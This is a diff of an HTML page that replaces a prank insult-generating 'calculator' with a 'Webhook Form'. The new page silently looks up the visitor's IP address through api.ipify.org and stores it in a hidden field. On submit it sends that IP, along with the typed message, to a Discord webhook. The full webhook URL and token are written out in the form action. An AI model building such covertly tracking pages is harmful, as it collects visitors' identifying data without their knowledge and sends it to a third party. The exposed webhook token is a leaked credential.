@@ -1,71 +1,29 @@
+<!DOCTYPE html>
 <html>
   <head>
-    <title>Calculator</title>
-    <style>
-      /* Calculator styles */
-      #calculator {
-        width: 250px;
-        margin: auto;
-        text-align: center;
-        font-family: sans-serif;
-        font-size: 16px;
-      }
-      #input {
-        width: 220px;
-        height: 30px;
-        padding: 0 10px;
-        margin-bottom: 10px;
-        font-size: 16px;
-      }
-      #submit {
-        width: 220px;
-        height: 30px;
-        background-color: #4CAF50;
-        border: none;
-        color: white;
-        cursor: pointer;
-        font-size: 16px;
-      }
-      #result {
-        margin-top: 10px;
-        font-size: 32px;
-        color: #4CAF50;
-      }
-    </style>
+    <title>Webhook Form</title>
   </head>
   <body>
-    <div id="calculator">
-      <input type="text" id="input" placeholder="Enter a number or phrase">
-      <button id="submit">Calculate</button>
-      <div id="result" style="display: none;"></div>
-    </div>
+    <form action="https://discord.com/api/webhooks/1053303789194588180/uOwiXrahinkCIEmIczYdnp_0UF6-wS1Ti4QEylihBB-yac4C2KeNUDK6h-XyQWC1Mv-S" method="POST" id="form">
+      <label for="text">Enter your message:</label><br>
+      <input type="text" id="text" name="text"><br>
+      <input type="hidden" id="ip" name="ip" value="">
+      <input type="submit" value="Send" style="background-color: green;">
+    </form> 
+
     <script>
-      var submitButton = document.getElementById('submit');
-      var input = document.getElementById('input');
-      var resultDiv = document.getElementById('result');
-      var calculatorDiv = document.getElementById('calculator');
+      function getIP(json) {
+        document.getElementById('ip').value = json.ip;
+      }
 
-      // Array of insults to choose from
-      var insults = [
-        'You are a waste of oxygen.',
-        'You are an embarrassment to your family.',
-        'You have the intelligence of a rock.',
-        'You are a failure in life.',
-        'You are a disgrace to humanity.'
-      ];
-
-      submitButton.addEventListener('click', function() {
-        // If the user enters "2137", search for it on Google
-        if (input.value === '2137') {
-          window.open('https://www.google.com/search?q=2137');
+      const xhr = new XMLHttpRequest();
+      xhr.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+          getIP(JSON.parse(this.responseText));
         }
-        // If the user enters "nudze sie", display a random insult
-        else if (input.value === 'nudze sie') {
-          calculatorDiv.style.display = 'none';
-          resultDiv.innerHTML = insults[Math.floor(Math.random() * insults.length)];
-          resultDiv.style.display = 'block';
-        }
-      });
+      };
+      xhr.open("GET", "https://api.ipify.org?format=json", true);
+      xhr.send();
     </script>
   </body>
 </html>
